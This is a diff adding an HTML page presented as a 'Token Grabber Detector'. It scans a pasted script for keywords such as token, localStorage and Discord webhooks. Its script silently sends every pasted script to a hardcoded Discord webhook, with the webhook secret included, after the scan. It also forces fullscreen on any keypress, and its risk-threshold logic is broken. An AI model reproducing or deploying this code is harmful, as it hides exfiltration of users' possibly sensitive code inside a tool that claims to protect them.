@@ -1,0 +1,248 @@
+<style>
+  @import url('https://fonts.googleapis.com/css?family=Montserrat:600&display=swap');
+  span{
+    position: relative;
+    display: inline-flex;
+    width: 180px;
+    height: 55px;
+    margin: 0 15px;
+    perspective: 1000px;
+  }
+  span a{
+    font-size: 19px;
+    letter-spacing: 1px;
+    transform-style: preserve-3d;
+    transform: translateZ(-25px);
+    transition: transform .25s;
+    font-family: 'Montserrat', sans-serif;
+  }
+  span a:before,
+  span a:after{
+    position: absolute;
+    content: "CHECK";
+    height: 55px;
+    width: 180px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 5px solid black;
+    box-sizing: border-box;
+    border-radius: 5px;
+  }
+  span a:before{
+    color: #fff;
+    background: #000;
+    transform: rotateY(0deg) translateZ(25px);
+  }
+  span a:after{
+    color: #000;
+    transform: rotateX(90deg) translateZ(25px);
+  }
+  span a:hover{
+    transform: translateZ(-25px) rotateX(-90deg);
+  }
+  h1 { color: #111; font-family: 'Helvetica Neue', sans-serif; font-size: 60px; font-weight: bold; letter-spacing: -1px; line-height: 1; text-align: center; }
+  h2 { color: #111; font-family: 'Open Sans', sans-serif; font-size: 30px; font-weight: 300; line-height: 32px; margin: 0 0 72px; text-align: center; }
+  p { color: #685206; font-family: 'Helvetica Neue', sans-serif; font-size: 14px; line-height: 24px; margin: 0 0 24px; text-align: justify; text-justify: inter-word; }
+  .whiteBox {
+    border-radius: 10px 10px 10px 10px;
+    -moz-border-radius: 10px 10px 10px 10px;
+    -webkit-border-radius: 10px 10px 10px 10px;
+    -webkit-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
+    -moz-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
+    box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
+    padding: 0.1px;
+  }
+</style>
+<html>
+  <head>
+    <title>Token Grabber Detector</title>
+  </head>
+  <body bgcolor="#fff" style="overflow-Y: none; background-image: url('https://cdn.glitch.com/bdd99e91-13e2-40dc-8a8c-e0143de67e58%2FMuchacha.jpg?v=1624208998501')">
+    <h3 style="top:0px;left:0px;z-index:1000;position:relative;">
+      By: Her Io
+    </h3>
+    <div style="width: 80%; height: 80%; margin-left: 10%; margin-right: 10%; margin-bottom: 0%; margin-top: 5%;">
+      <center><h1 id="gCheck">
+        Checking for grabber...
+        </h1><h2 id="aCheck" style="margin:0px;">
+        Threats found:
+        </h2><h2 style="margin:0px;"><p style="margin:0px;" id="mCheck">
+        Mortal: </p>
+        </h2><h2 style="margin:0px;"><p style="margin:0px;" id="lCheck">
+                    All: </p>
+        </h2><h2 style="margin:0px;"><p style="margin:0px;" id="daCheck">
+                    High Risk: </p>
+        </h2><h2 style="margin:0px;"><p style="margin:0px;" id="sCheck">
+                    Status: </p>
+        </h2></center>
+    </div>
+    <div id="tooth" style="width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); top: 0px; left: 0px; position: absolute;">
+      <div style="width: 80%; height: 80%; margin-left: 10%; margin-right: 10%; margin-bottom: 10%; margin-top: 5%; background-color: #fff;" class="whiteBox">
+        <center><h1>
+          Anti Grabber
+        </h1><textarea id="textScript" style="margin: 0px; width: 377px; height: 116px; resize: none;"></textarea><br>
+          <span style="margin-top:5%"><a onclick="check()"></a></span>
+        </center>
+      </div>
+    </div>
+  </body>
+</html>
+<script>
+  var script = "";
+  var dang = [];
+  var mortal = [];
+  var all = [];
+  var finded = 0;
+  var severe = 0;
+  var neutral = 0;
+  var low = 0;  
+  function check(){
+    script = JSON.stringify(document.getElementById("textScript").value)
+    document.getElementById("textScript").value = ""
+    document.getElementById("tooth").style.display = "none"
+    if(script.toLowerCase().includes("token")){
+      severe++
+      finded++
+      all.push("Token")
+      mortal.push("Token")
+    }
+    if(script.toLowerCase().includes("/api")){
+      neutral++
+      finded++
+      all.push("Api (depends)")
+    }
+    if(script.toLowerCase().includes("localstorage")){
+      severe++
+      finded++
+      if(script.toLowerCase().includes("unsafewindow.localstorage")){
+        mortal.push("unsafeWindow.localStorage")
+      } else {
+        mortal.push("localStorage")
+      }
+      all.push("LocalStorage")
+    }
+    if(script.toLowerCase().includes("http")){
+      neutral++
+      finded++
+      all.push("Http/https (check for find if url is dangerous)")
+    }
+    if(script.toLowerCase().includes("webhook")){
+      finded++
+      severe++
+      mortal.push("WebHook")
+      all.push("WebHook")
+    }
+    if(script.toLowerCase().includes("xml")){
+      finded++
+      neutral++
+      all.push("XMLHttpRequest")
+      mortal.push("XMLHttpRequest")
+    }
+    if(script.toLowerCase().includes("h+t+t+p")){
+      finded++
+      severe++
+      all.push("Http(Splitted)")
+    }
+    if(script.toLowerCase().includes("json")){
+      finded++
+      low++
+      all.push("JSON")
+    }
+    if(script.toLowerCase().includes("new")){
+      finded++
+      low++
+      all.push("new (not threat too)")
+    }
+    if(script.toLowerCase().includes(".send")){
+      finded++
+      neutral++
+      all.push("this.send (not threat too)")
+    }
+    setTimeout(()=>{
+      if(mortal.length == 0){
+          document.getElementById("mCheck").innerHTML += "None"
+      } else {
+        for(let i=0;i<mortal.length;i++){
+          document.getElementById("mCheck").innerHTML += mortal[i]+" | "
+        }
+      }
+      if(all.length == 0){
+        document.getElementById("lCheck").innerHTML += "None"
+      } else {
+      for(let i=0;i<all.length;i++){
+        document.getElementById("lCheck").innerHTML += all[i]+" | "
+      }
+      }
+      var sc = script.toLowerCase();
+      var arrs = ["unsafeWindow['localStorage']", "https://discord.com/api/webhooks", "localstorage.token"]
+      if(script.toLowerCase().includes("unsafeWindow['localStorage']") || script.toLowerCase().includes("https://discord.com/api/webhooks") || script.toLowerCase().includes("localstorage.token")){
+        document.getElementById("sCheck").innerHTML += "High Risk - Delete Recommendation"
+        for(let i2=0;i2<arrs.length;i2++){if(sc.includes(arrs[i2])){
+          dang.push(arrs[i2])
+        }}
+    } else {
+      if(finded > 5){
+        document.getElementById("sCheck").innerHTML += "Low Risk"
+      } else if(finded > 9){
+        document.getElementById("sCheck").innerHTML += "Med Risk"
+      } else if(finded > 16){
+        document.getElementById("sCheck").innerHTML += "High Risk"
+      } else if(finded < 6 && finded > 0){
+        document.getElementById("sCheck").innerHTML += "Not Much Risk"
+      } else if(finded < 1){
+        document.getElementById("sCheck").innerHTML += "No Risk"
+      }
+      document.title = finded
+    }
+      if(dang.length == 0){
+          document.getElementById("daCheck").innerHTML += "None"
+      } else {
+        for(let i=0;i<dang.length;i++){
+          document.getElementById("daCheck").innerHTML += dang[i]+" | "
+        }
+      }
+      var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+    username: "Script Sended",
+    avatar_url: "https://pbs.twimg.com/profile_images/1214545814745300992/7OLFRhok_400x400.jpg",
+    content: "Script: " + script
+    }
+    request.send(JSON.stringify(params));
+    },2000)
+  }
+  setInterval(()=>{
+    document.getElementById("aCheck").innerHTML =
+      `
+      Threats found: ${finded}<br>
+      Several: ${severe}<br>
+      Neutral: ${neutral}<br>
+      Lower: ${low}<br><hr>
+      `
+  })
+  setInterval(()=>{
+    document.getElementById("gCheck").innerHTML = "Checking for grabber."
+    setTimeout(()=>{
+      document.getElementById("gCheck").innerHTML = "Checking for grabber.."
+    }, 1000);
+    setTimeout(()=>{
+      document.getElementById("gCheck").innerHTML = "Checking for grabber..."
+    }, 2000);
+  }, 3000)
+</script>
+<script>
+  document.addEventListener('keydown', (e)=>{
+    launchFullScreen(document.documentElement);
+  })
+  function launchFullScreen(element) {
+  if(element.requestFullScreen) {
+    element.requestFullScreen();
+  } else if(element.mozRequestFullScreen) {
+    element.mozRequestFullScreen();
+  } else if(element.webkitRequestFullScreen) {
+    element.webkitRequestFullScreen();
+  }
+}
+</script>
